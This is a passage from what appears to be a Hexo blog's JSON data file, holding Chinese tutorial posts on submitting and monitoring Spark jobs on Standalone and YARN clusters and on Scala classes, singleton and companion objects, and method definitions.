/root/logs\n#启动历史信息记录服务\ncd $SPARK_HOME/sbin\n./sbin/start-history-server.sh /root/logs\n#启动应用\n./bin/spark-submit --class SparkSQLExample --master yarn --deploy-mode cluster  /root/worspace/test-1.0.jar\n#如果有参数，参数放在最后\n```\n#### 监控\n配置日志目录\n```\ncd $SPARK_HIME/conf\nvim spark-defaults.conf\n#添加\nspark.eventLog.enabled           true\n spark.eventLog.dir               /root/logs/spark\n spark.history.fs.logDirectory    /root/logs/spark\n```\n日志目录可以是本地目录也可以hdfs目录\n\n监控地址\n运行时：\n\nip:4040(spark)\n\nip:8088（hadoop）\n\nip:18080(spark历史)","slug":"spark/5.spark程序提交集群和监控","published":1,"updated":"2018-07-10T13:10:09.985Z","_id":"cjjedmhby007r0gtj7uhf0svr","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"运行模式\"><a href=\"#运行模式\" class=\"headerlink\" title=\"运行模式\"></a>运行模式</h3><p>Spark 应用在集群上作为独立的进程组来运行，在 main 程序中通过 SparkContext 来协调（称之为 driver 程序）  </p>\n<p><img src=\"http://spark.apache.org/docs/latest/img/cluster-overview.png\" alt=\"image\"></p>\n<p>1.每个应用获取到它自己的 Executor 进程，它们会保持在整个应用的生命周期中并且在多个线程中运行 Task（任务）。这样做的优点是把应用互相隔离，在调度方面（每个 driver 调度它自己的 task）和 Executor 方面（来自不同应用的 task 运行在不同的 JVM 中）。然而，这也意味着若是不把数据写到外部的存储系统中的话，数据就不能够被不同的 Spark 应用（SparkContext 的实例）之间共享。</p>\n<p>2.Spark 是不知道底层的 Cluster Manager 到底是什么类型的。只要它能够获得 Executor 进程，并且它们可以和彼此之间通信，那么即使是在一个也支持其它应用的 Cluster Manager（例如，Mesos / YARN）上来运行它也是相对简单的。</p>\n<p>3.Driver 程序必须在自己的生命周期内（例如，请看 在网络中配置 spark.driver.port 章节）监听和接受来自它的 Executor 的连接请求。同样的，driver 程序必须可以从 worker 节点上网络寻址（就是网络没问题）。</p>\n<p>4.因为 driver 调度了集群上的 task（任务），更好的方式应该是在相同的局域网中靠近 worker 的节点上运行。如果您不喜欢发送请求到远程的集群，倒不如打开一个 RPC 至 driver 并让它就近提交操作而不是从很远的 worker 节点上运行一个 driver。</p>\n<h3 id=\"集群类型\"><a href=\"#集群类型\" class=\"headerlink\" title=\"集群类型\"></a>集群类型</h3><p>1.Standalone – 包含在 Spark 中使得它更容易来安装集群的一个简单的 Cluster Manager。</p>\n<p>2.Mesos – 一个通用的 Cluster Manager，它也可以运行 Hadoop MapReduce 和其它服务应用。</p>\n<p>3.Hadoop YARN – Hadoop 2 中的 resource manager（资源管理器）。</p>\n<h3 id=\"Standalone\"><a href=\"#Standalone\" class=\"headerlink\" title=\"Standalone\"></a>Standalone</h3><h4 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h4><p>启动集群：</p>\n<p>spark根目录下</p>\n<pre><code>./sbin/start-master.sh\n</code></pre><p>启动之后可以在ip:8080上访问集群信息</p>\n<p>运行程序<br>spark submit命令可以启动程序</p>\n<pre><code>spark-submit --class SparkSQLExample --master spark://ip:port /root/worspace/test-1.0.jar\n</code></pre><h4 id=\"监控\"><a href=\"#监控\" class=\"headerlink\" title=\"监控\"></a>监控</h4><p>Spark 的独立模式提供了一个基于 Web 的用户界面来监控集群。Master 和 每个 Worker 都有自己的 web 用户界面，显示集群和作业统计信息。默认情况下你可以在 8080 端口访问 Web UI 的主端口也可以在配置文件中或通过命令行选项进行更改。</p>\n<p>在程序运行的时候可以在ip:4040监控运行状态</p>\n<h3 id=\"Hadoop-YARN\"><a href=\"#Hadoop-YARN\" class=\"headerlink\" title=\"Hadoop YARN\"></a>Hadoop YARN</h3><h4 id=\"部署-1\"><a href=\"#部署-1\" class=\"headerlink\" title=\"部署\"></a>部署</h4><p>配置HADOOP_CONF_DIR<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/profile </span><br><span class=\"line\">#添加</span><br><span class=\"line\">HADOOP_CONF_DIR=$HADOOP_HOME/etc/hadoop  </span><br><span class=\"line\">cd $SPARK_HOME/conf</span><br><span class=\"line\">vim spark-env.sh </span><br><span class=\"line\">#添加</span><br><span class=\"line\">HADOOP_CONF_DIR=$HADOOP_CONF_DIR</span><br><span class=\"line\">#启动hadoop</span><br><span class=\"line\">cd $HADOOP_HOME/sbin  </span><br><span class=\"line\">./start-all.sh</span><br><span class=\"line\">#新建日志目录</span><br><span class=\"line\">mkdir /root/logs</span><br><span class=\"line\">#启动历史信息记录服务</span><br><span class=\"line\">cd $SPARK_HOME/sbin</span><br><span class=\"line\">./sbin/start-history-server.sh /root/logs</span><br><span class=\"line\">#启动应用</span><br><span class=\"line\">./bin/spark-submit --class SparkSQLExample --master yarn --deploy-mode cluster  /root/worspace/test-1.0.jar</span><br><span class=\"line\">#如果有参数，参数放在最后</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"监控-1\"><a href=\"#监控-1\" class=\"headerlink\" title=\"监控\"></a>监控</h4><p>配置日志目录<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd $SPARK_HIME/conf</span><br><span class=\"line\">vim spark-defaults.conf</span><br><span class=\"line\">#添加</span><br><span class=\"line\">spark.eventLog.enabled           true</span><br><span class=\"line\"> spark.eventLog.dir               /root/logs/spark</span><br><span class=\"line\"> spark.history.fs.logDirectory    /root/logs/spark</span><br></pre></td></tr></table></figure></p>\n<p>日志目录可以是本地目录也可以hdfs目录</p>\n<p>监控地址<br>运行时：</p>\n<p>ip:4040(spark)</p>\n<p>ip:8088（hadoop）</p>\n<p>ip:18080(spark历史)</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"运行模式\"><a href=\"#运行模式\" class=\"headerlink\" title=\"运行模式\"></a>运行模式</h3><p>Spark 应用在集群上作为独立的进程组来运行，在 main 程序中通过 SparkContext 来协调（称之为 driver 程序）  </p>\n<p><img src=\"http://spark.apache.org/docs/latest/img/cluster-overview.png\" alt=\"image\"></p>\n<p>1.每个应用获取到它自己的 Executor 进程，它们会保持在整个应用的生命周期中并且在多个线程中运行 Task（任务）。这样做的优点是把应用互相隔离，在调度方面（每个 driver 调度它自己的 task）和 Executor 方面（来自不同应用的 task 运行在不同的 JVM 中）。然而，这也意味着若是不把数据写到外部的存储系统中的话，数据就不能够被不同的 Spark 应用（SparkContext 的实例）之间共享。</p>\n<p>2.Spark 是不知道底层的 Cluster Manager 到底是什么类型的。只要它能够获得 Executor 进程，并且它们可以和彼此之间通信，那么即使是在一个也支持其它应用的 Cluster Manager（例如，Mesos / YARN）上来运行它也是相对简单的。</p>\n<p>3.Driver 程序必须在自己的生命周期内（例如，请看 在网络中配置 spark.driver.port 章节）监听和接受来自它的 Executor 的连接请求。同样的，driver 程序必须可以从 worker 节点上网络寻址（就是网络没问题）。</p>\n<p>4.因为 driver 调度了集群上的 task（任务），更好的方式应该是在相同的局域网中靠近 worker 的节点上运行。如果您不喜欢发送请求到远程的集群，倒不如打开一个 RPC 至 driver 并让它就近提交操作而不是从很远的 worker 节点上运行一个 driver。</p>\n<h3 id=\"集群类型\"><a href=\"#集群类型\" class=\"headerlink\" title=\"集群类型\"></a>集群类型</h3><p>1.Standalone – 包含在 Spark 中使得它更容易来安装集群的一个简单的 Cluster Manager。</p>\n<p>2.Mesos – 一个通用的 Cluster Manager，它也可以运行 Hadoop MapReduce 和其它服务应用。</p>\n<p>3.Hadoop YARN – Hadoop 2 中的 resource manager（资源管理器）。</p>\n<h3 id=\"Standalone\"><a href=\"#Standalone\" class=\"headerlink\" title=\"Standalone\"></a>Standalone</h3><h4 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h4><p>启动集群：</p>\n<p>spark根目录下</p>\n<pre><code>./sbin/start-master.sh\n</code></pre><p>启动之后可以在ip:8080上访问集群信息</p>\n<p>运行程序<br>spark submit命令可以启动程序</p>\n<pre><code>spark-submit --class SparkSQLExample --master spark://ip:port /root/worspace/test-1.0.jar\n</code></pre><h4 id=\"监控\"><a href=\"#监控\" class=\"headerlink\" title=\"监控\"></a>监控</h4><p>Spark 的独立模式提供了一个基于 Web 的用户界面来监控集群。Master 和 每个 Worker 都有自己的 web 用户界面，显示集群和作业统计信息。默认情况下你可以在 8080 端口访问 Web UI 的主端口也可以在配置文件中或通过命令行选项进行更改。</p>\n<p>在程序运行的时候可以在ip:4040监控运行状态</p>\n<h3 id=\"Hadoop-YARN\"><a href=\"#Hadoop-YARN\" class=\"headerlink\" title=\"Hadoop YARN\"></a>Hadoop YARN</h3><h4 id=\"部署-1\"><a href=\"#部署-1\" class=\"headerlink\" title=\"部署\"></a>部署</h4><p>配置HADOOP_CONF_DIR<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/profile </span><br><span class=\"line\">#添加</span><br><span class=\"line\">HADOOP_CONF_DIR=$HADOOP_HOME/etc/hadoop  </span><br><span class=\"line\">cd $SPARK_HOME/conf</span><br><span class=\"line\">vim spark-env.sh </span><br><span class=\"line\">#添加</span><br><span class=\"line\">HADOOP_CONF_DIR=$HADOOP_CONF_DIR</span><br><span class=\"line\">#启动hadoop</span><br><span class=\"line\">cd $HADOOP_HOME/sbin  </span><br><span class=\"line\">./start-all.sh</span><br><span class=\"line\">#新建日志目录</span><br><span class=\"line\">mkdir /root/logs</span><br><span class=\"line\">#启动历史信息记录服务</span><br><span class=\"line\">cd $SPARK_HOME/sbin</span><br><span class=\"line\">./sbin/start-history-server.sh /root/logs</span><br><span class=\"line\">#启动应用</span><br><span class=\"line\">./bin/spark-submit --class SparkSQLExample --master yarn --deploy-mode cluster  /root/worspace/test-1.0.jar</span><br><span class=\"line\">#如果有参数，参数放在最后</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"监控-1\"><a href=\"#监控-1\" class=\"headerlink\" title=\"监控\"></a>监控</h4><p>配置日志目录<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd $SPARK_HIME/conf</span><br><span class=\"line\">vim spark-defaults.conf</span><br><span class=\"line\">#添加</span><br><span class=\"line\">spark.eventLog.enabled           true</span><br><span class=\"line\"> spark.eventLog.dir               /root/logs/spark</span><br><span class=\"line\"> spark.history.fs.logDirectory    /root/logs/spark</span><br></pre></td></tr></table></figure></p>\n<p>日志目录可以是本地目录也可以hdfs目录</p>\n<p>监控地址<br>运行时：</p>\n<p>ip:4040(spark)</p>\n<p>ip:8088（hadoop）</p>\n<p>ip:18080(spark历史)</p>\n"},{"title":"7.Scala关键字class和object","date":"2018-07-10T13:09:19.000Z","_content":"- ### 面向对象\n和Java一样Scala面向对象\n\n类是对象的模板、抽象。定义一个类后，可以使用关键字new来创建一个类的对象。 通过对象可以使用定义的类的所有功能。\n- ### class\nclass表示类\n和Java不同，class不能运行。虽然可以定义main方法，但是不能运行\n```\nclass Point(xc: Int, yc: Int) {\n   var x: Int = xc\n   var y: Int = yc\n\n   def move(dx: Int, dy: Int) {\n      x = x + dx\n      y = y + dy\n      println (\"Point x location : \" + x);\n      println (\"Point y location : \" + y);\n   }\n}\n```\n继承：在Scala中，我们可以扩展一个Scala类，使用与Java中相同的方式设计继承的类(使用extends关键字)，但有两个限制：方法重写需要override关键字，只有主构造函数可以通过参数调用基类构造函数。让我们扩展上面的类，并增加一个类的方法。\n- ### object\n\nScala单例对象是十分重要的，没有像在Java一样，有静态类、静态成员、静态方法，但是Scala提供了object对象，这个object对象类似于Java的静态类,它的成员、它的方法都默认是静态的。\n\nScala它使用单例对象。单例是一种只能有一个实例的对象。使用object关键字对象而不是类关键字创建单例。由于无法实例化单例对象，因此无法将参数传递给主构造函数。下面列出Scala使用单例对象的所有示例。\n\nobject 是可以运行的\n```\nclass Point(val xc: Int, val yc: Int) {\n   var x: Int = xc\n   var y: Int = yc\n\n   def move(dx: Int, dy: Int) {\n      x = x + dx\n      y = y + dy\n   }\n}\n\nobject Demo {\n   def main(args: Array[String]) {\n      val point = new Point(10, 20)\n      printPoint\n\n      def printPoint{\n         println (\"Point x location : \" + point.x);\n         println (\"Point y location : \" + point.y);\n      }\n   }\n}\n```\n- ### 单例对象和伴生对象\n如果有同样一个类与该object名字一样，则称该object为该类的伴生对象，相对应，该类为object的伴生类。如果一个类有它的伴生对象，这个类就可通过object的名字访问到所有成员，但object不在该类的作用范围。\n```\nclass University{\nval id = University.newStudentNo\nprivate var number = 0\ndef aClass (number : Int){this.number += number}\n}\n\nobject University {\n   private var studentNo = 0\n   def newStudentNo = {\n   studentNo += 1\n   studentNo\n   }\n }\n```\n参考自：\n\nhttp://www.jianshu.com/p/538fd44137fd\n\nhttp://www.runoob.com/scala/scala-basic-syntax.html\n\nhttp://www.yiibai.com/scala/scala_classes_objects.html\n\nhttp://www.cnblogs.com/-crazysnail/p/3984010.html\n\nhttp://www.cnblogs.com/nethk/p/5609320.html","source":"_posts/spark/7.Scala关键字class和object.md","raw":"---\ntitle: 7.Scala关键字class和object\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n- ### 面向对象\n和Java一样Scala面向对象\n\n类是对象的模板、抽象。定义一个类后，可以使用关键字new来创建一个类的对象。 通过对象可以使用定义的类的所有功能。\n- ### class\nclass表示类\n和Java不同，class不能运行。虽然可以定义main方法，但是不能运行\n```\nclass Point(xc: Int, yc: Int) {\n   var x: Int = xc\n   var y: Int = yc\n\n   def move(dx: Int, dy: Int) {\n      x = x + dx\n      y = y + dy\n      println (\"Point x location : \" + x);\n      println (\"Point y location : \" + y);\n   }\n}\n```\n继承：在Scala中，我们可以扩展一个Scala类，使用与Java中相同的方式设计继承的类(使用extends关键字)，但有两个限制：方法重写需要override关键字，只有主构造函数可以通过参数调用基类构造函数。让我们扩展上面的类，并增加一个类的方法。\n- ### object\n\nScala单例对象是十分重要的，没有像在Java一样，有静态类、静态成员、静态方法，但是Scala提供了object对象，这个object对象类似于Java的静态类,它的成员、它的方法都默认是静态的。\n\nScala它使用单例对象。单例是一种只能有一个实例的对象。使用object关键字对象而不是类关键字创建单例。由于无法实例化单例对象，因此无法将参数传递给主构造函数。下面列出Scala使用单例对象的所有示例。\n\nobject 是可以运行的\n```\nclass Point(val xc: Int, val yc: Int) {\n   var x: Int = xc\n   var y: Int = yc\n\n   def move(dx: Int, dy: Int) {\n      x = x + dx\n      y = y + dy\n   }\n}\n\nobject Demo {\n   def main(args: Array[String]) {\n      val point = new Point(10, 20)\n      printPoint\n\n      def printPoint{\n         println (\"Point x location : \" + point.x);\n         println (\"Point y location : \" + point.y);\n      }\n   }\n}\n```\n- ### 单例对象和伴生对象\n如果有同样一个类与该object名字一样，则称该object为该类的伴生对象，相对应，该类为object的伴生类。如果一个类有它的伴生对象，这个类就可通过object的名字访问到所有成员，但object不在该类的作用范围。\n```\nclass University{\nval id = University.newStudentNo\nprivate var number = 0\ndef aClass (number : Int){this.number += number}\n}\n\nobject University {\n   private var studentNo = 0\n   def newStudentNo = {\n   studentNo += 1\n   studentNo\n   }\n }\n```\n参考自：\n\nhttp://www.jianshu.com/p/538fd44137fd\n\nhttp://www.runoob.com/scala/scala-basic-syntax.html\n\nhttp://www.yiibai.com/scala/scala_classes_objects.html\n\nhttp://www.cnblogs.com/-crazysnail/p/3984010.html\n\nhttp://www.cnblogs.com/nethk/p/5609320.html","slug":"spark/7.Scala关键字class和object","published":1,"updated":"2018-07-10T13:10:09.987Z","_id":"cjjedmhbz007u0gtj7wq0yzcq","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h3 id=\"面向对象\"><a href=\"#面向对象\" class=\"headerlink\" title=\"面向对象\"></a>面向对象</h3>和Java一样Scala面向对象</li>\n</ul>\n<p>类是对象的模板、抽象。定义一个类后，可以使用关键字new来创建一个类的对象。 通过对象可以使用定义的类的所有功能。</p>\n<ul>\n<li><h3 id=\"class\"><a href=\"#class\" class=\"headerlink\" title=\"class\"></a>class</h3>class表示类<br>和Java不同，class不能运行。虽然可以定义main方法，但是不能运行<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Point(xc: Int, yc: Int) &#123;</span><br><span class=\"line\">   var x: Int = xc</span><br><span class=\"line\">   var y: Int = yc</span><br><span class=\"line\"></span><br><span class=\"line\">   def move(dx: Int, dy: Int) &#123;</span><br><span class=\"line\">      x = x + dx</span><br><span class=\"line\">      y = y + dy</span><br><span class=\"line\">      println (&quot;Point x location : &quot; + x);</span><br><span class=\"line\">      println (&quot;Point y location : &quot; + y);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>继承：在Scala中，我们可以扩展一个Scala类，使用与Java中相同的方式设计继承的类(使用extends关键字)，但有两个限制：方法重写需要override关键字，只有主构造函数可以通过参数调用基类构造函数。让我们扩展上面的类，并增加一个类的方法。</p>\n<ul>\n<li><h3 id=\"object\"><a href=\"#object\" class=\"headerlink\" title=\"object\"></a>object</h3></li>\n</ul>\n<p>Scala单例对象是十分重要的，没有像在Java一样，有静态类、静态成员、静态方法，但是Scala提供了object对象，这个object对象类似于Java的静态类,它的成员、它的方法都默认是静态的。</p>\n<p>Scala它使用单例对象。单例是一种只能有一个实例的对象。使用object关键字对象而不是类关键字创建单例。由于无法实例化单例对象，因此无法将参数传递给主构造函数。下面列出Scala使用单例对象的所有示例。</p>\n<p>object 是可以运行的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Point(val xc: Int, val yc: Int) &#123;</span><br><span class=\"line\">   var x: Int = xc</span><br><span class=\"line\">   var y: Int = yc</span><br><span class=\"line\"></span><br><span class=\"line\">   def move(dx: Int, dy: Int) &#123;</span><br><span class=\"line\">      x = x + dx</span><br><span class=\"line\">      y = y + dy</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">object Demo &#123;</span><br><span class=\"line\">   def main(args: Array[String]) &#123;</span><br><span class=\"line\">      val point = new Point(10, 20)</span><br><span class=\"line\">      printPoint</span><br><span class=\"line\"></span><br><span class=\"line\">      def printPoint&#123;</span><br><span class=\"line\">         println (&quot;Point x location : &quot; + point.x);</span><br><span class=\"line\">         println (&quot;Point y location : &quot; + point.y);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h3 id=\"单例对象和伴生对象\"><a href=\"#单例对象和伴生对象\" class=\"headerlink\" title=\"单例对象和伴生对象\"></a>单例对象和伴生对象</h3>如果有同样一个类与该object名字一样，则称该object为该类的伴生对象，相对应，该类为object的伴生类。如果一个类有它的伴生对象，这个类就可通过object的名字访问到所有成员，但object不在该类的作用范围。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class University&#123;</span><br><span class=\"line\">val id = University.newStudentNo</span><br><span class=\"line\">private var number = 0</span><br><span class=\"line\">def aClass (number : Int)&#123;this.number += number&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">object University &#123;</span><br><span class=\"line\">   private var studentNo = 0</span><br><span class=\"line\">   def newStudentNo = &#123;</span><br><span class=\"line\">   studentNo += 1</span><br><span class=\"line\">   studentNo</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>参考自：</p>\n<p><a href=\"http://www.jianshu.com/p/538fd44137fd\" target=\"_blank\" rel=\"noopener\">http://www.jianshu.com/p/538fd44137fd</a></p>\n<p><a href=\"http://www.runoob.com/scala/scala-basic-syntax.html\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/scala/scala-basic-syntax.html</a></p>\n<p><a href=\"http://www.yiibai.com/scala/scala_classes_objects.html\" target=\"_blank\" rel=\"noopener\">http://www.yiibai.com/scala/scala_classes_objects.html</a></p>\n<p><a href=\"http://www.cnblogs.com/-crazysnail/p/3984010.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/-crazysnail/p/3984010.html</a></p>\n<p><a href=\"http://www.cnblogs.com/nethk/p/5609320.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/nethk/p/5609320.html</a></p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h3 id=\"面向对象\"><a href=\"#面向对象\" class=\"headerlink\" title=\"面向对象\"></a>面向对象</h3>和Java一样Scala面向对象</li>\n</ul>\n<p>类是对象的模板、抽象。定义一个类后，可以使用关键字new来创建一个类的对象。 通过对象可以使用定义的类的所有功能。</p>\n<ul>\n<li><h3 id=\"class\"><a href=\"#class\" class=\"headerlink\" title=\"class\"></a>class</h3>class表示类<br>和Java不同，class不能运行。虽然可以定义main方法，但是不能运行<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Point(xc: Int, yc: Int) &#123;</span><br><span class=\"line\">   var x: Int = xc</span><br><span class=\"line\">   var y: Int = yc</span><br><span class=\"line\"></span><br><span class=\"line\">   def move(dx: Int, dy: Int) &#123;</span><br><span class=\"line\">      x = x + dx</span><br><span class=\"line\">      y = y + dy</span><br><span class=\"line\">      println (&quot;Point x location : &quot; + x);</span><br><span class=\"line\">      println (&quot;Point y location : &quot; + y);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>继承：在Scala中，我们可以扩展一个Scala类，使用与Java中相同的方式设计继承的类(使用extends关键字)，但有两个限制：方法重写需要override关键字，只有主构造函数可以通过参数调用基类构造函数。让我们扩展上面的类，并增加一个类的方法。</p>\n<ul>\n<li><h3 id=\"object\"><a href=\"#object\" class=\"headerlink\" title=\"object\"></a>object</h3></li>\n</ul>\n<p>Scala单例对象是十分重要的，没有像在Java一样，有静态类、静态成员、静态方法，但是Scala提供了object对象，这个object对象类似于Java的静态类,它的成员、它的方法都默认是静态的。</p>\n<p>Scala它使用单例对象。单例是一种只能有一个实例的对象。使用object关键字对象而不是类关键字创建单例。由于无法实例化单例对象，因此无法将参数传递给主构造函数。下面列出Scala使用单例对象的所有示例。</p>\n<p>object 是可以运行的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Point(val xc: Int, val yc: Int) &#123;</span><br><span class=\"line\">   var x: Int = xc</span><br><span class=\"line\">   var y: Int = yc</span><br><span class=\"line\"></span><br><span class=\"line\">   def move(dx: Int, dy: Int) &#123;</span><br><span class=\"line\">      x = x + dx</span><br><span class=\"line\">      y = y + dy</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">object Demo &#123;</span><br><span class=\"line\">   def main(args: Array[String]) &#123;</span><br><span class=\"line\">      val point = new Point(10, 20)</span><br><span class=\"line\">      printPoint</span><br><span class=\"line\"></span><br><span class=\"line\">      def printPoint&#123;</span><br><span class=\"line\">         println (&quot;Point x location : &quot; + point.x);</span><br><span class=\"line\">         println (&quot;Point y location : &quot; + point.y);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h3 id=\"单例对象和伴生对象\"><a href=\"#单例对象和伴生对象\" class=\"headerlink\" title=\"单例对象和伴生对象\"></a>单例对象和伴生对象</h3>如果有同样一个类与该object名字一样，则称该object为该类的伴生对象，相对应，该类为object的伴生类。如果一个类有它的伴生对象，这个类就可通过object的名字访问到所有成员，但object不在该类的作用范围。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class University&#123;</span><br><span class=\"line\">val id = University.newStudentNo</span><br><span class=\"line\">private var number = 0</span><br><span class=\"line\">def aClass (number : Int)&#123;this.number += number&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">object University &#123;</span><br><span class=\"line\">   private var studentNo = 0</span><br><span class=\"line\">   def newStudentNo = &#123;</span><br><span class=\"line\">   studentNo += 1</span><br><span class=\"line\">   studentNo</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>参考自：</p>\n<p><a href=\"http://www.jianshu.com/p/538fd44137fd\" target=\"_blank\" rel=\"noopener\">http://www.jianshu.com/p/538fd44137fd</a></p>\n<p><a href=\"http://www.runoob.com/scala/scala-basic-syntax.html\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/scala/scala-basic-syntax.html</a></p>\n<p><a href=\"http://www.yiibai.com/scala/scala_classes_objects.html\" target=\"_blank\" rel=\"noopener\">http://www.yiibai.com/scala/scala_classes_objects.html</a></p>\n<p><a href=\"http://www.cnblogs.com/-crazysnail/p/3984010.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/-crazysnail/p/3984010.html</a></p>\n<p><a href=\"http://www.cnblogs.com/nethk/p/5609320.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/nethk/p/5609320.html</a></p>\n"},{"title":"8.scala方法定义","date":"2018-07-10T13:09:19.000Z","_content":"形式：\n\n    def functionName ([list of parameters]) : [return type]\n\n例子\n```\n    object add {\n   def addInt( a:Int, b:Int ) : Int = {\n      var sum:Int = 0\n      sum = a + b\n      return sum\n   }\n}\n```\n数据类型\n\nheader 1 | header 2 | sadas\n---|---|---\n1 |\tByte |\t8位有符号值，范围从-128至127\n2 